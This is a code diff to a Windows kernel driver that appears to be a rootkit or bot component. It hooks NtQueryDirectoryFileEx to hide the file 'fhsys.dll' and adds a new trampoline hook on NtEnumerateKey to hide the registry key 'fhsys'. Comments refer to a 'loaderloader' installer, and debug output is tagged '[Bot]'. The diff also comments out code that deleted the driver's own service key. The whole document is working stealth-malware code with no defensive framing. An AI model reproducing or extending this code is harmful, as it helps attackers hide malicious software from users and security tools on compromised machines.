@@ -7,6 +7,8 @@
 #include "hde/hde64.h"
 #include "handler.h"
 #include "util.h"
+#include "querydir.h"
+#include "enumkey.h"
 
 __declspec(noinline) BOOLEAN fun(int n, int m) {
 	int r;
@@ -49,9 +51,9 @@ __declspec(noinline) void setDr(PVOID param) {
 }
 
 extern uint32_t drHit;
-extern UNICODE_STRING hiddenFile;
 
 NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;
+NtEnumerateKey_t origNtEnumerateKey;
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	HANDLE han;
@@ -66,9 +68,15 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	rand_state_t state;
 	hde64s hs;
 	const uint8_t absJmp[] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
-	uint8_t *tramp, queryDirInst;
+	uint8_t *tramp, queryDirInst, enumKeyInst;
 
 	RtlInitUnicodeString(&hiddenFile, L"fhsys.dll");
+	RtlInitUnicodeString(&hiddenReg, L"fhsys");
+
+	keyArrLock = ExAllocatePoolWithTag(NonPagedPool, sizeof(KSPIN_LOCK) + MAX_KEYHANDLEARR * sizeof(HANDLE), rand_tag(&state));
+	keyHandleArr = (PHANDLE)(((uint8_t*)keyArrLock) + sizeof(KSPIN_LOCK));
+	memset(keyHandleArr, 0, MAX_KEYHANDLEARR * sizeof(HANDLE));
+	KeInitializeSpinLock(keyArrLock);
 
 	rand_init(&state);
 
@@ -76,7 +84,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	HookKdTrap(handler);
 
 	queryDirInst = hde64_disasm(NtQueryDirectoryFileEx, &hs);
-	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, queryDirInst + sizeof(absJmp) * 1 + 8 * 1, rand_tag(&state));
+	enumKeyInst = hde64_disasm(funAddr.NtEnumerateKey, &hs);
+	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, (uint64_t)queryDirInst + (uint64_t)enumKeyInst + sizeof(absJmp) * 2 + 8 * 2, rand_tag(&state));
 
 	origNtQueryDirectoryFileEx = tramp;
 	memcpy(tramp, NtQueryDirectoryFileEx, queryDirInst);
@@ -85,7 +94,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	tramp += sizeof(absJmp);
 	*((uint64_t*)tramp) = (uint64_t)((uint8_t*)NtQueryDirectoryFileEx + queryDirInst);
 	tramp += 8;
-	
+
+	origNtEnumerateKey = tramp;
+	memcpy(tramp, (PVOID)funAddr.NtEnumerateKey, enumKeyInst);
+	tramp += enumKeyInst;
+	memcpy(tramp, absJmp, sizeof(absJmp));
+	tramp += sizeof(absJmp);
+	*((uint64_t*)tramp) = funAddr.NtEnumerateKey + (uint64_t)enumKeyInst;
+	tramp += 8;
 
 	//KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
 	//__debugbreak();
@@ -98,11 +114,13 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	DbgPrintEx(0, 0, "[Bot] %wZ\n", *RegistryPath);
 
+	/*
 	InitializeObjectAttributes(&oa, RegistryPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 	ZwOpenKey(&han, KEY_ALL_ACCESS, &oa);
 	status = ZwDeleteKey(han);
 	DbgPrintEx(0, 0, "[Bot] Delete key %x\n", status);
 	ZwClose(han);
+	*/
 
 	//NOTE: loaderloader first run: icudtl.dat
 	//NOTE: loaderloader installed: fhsys.dll
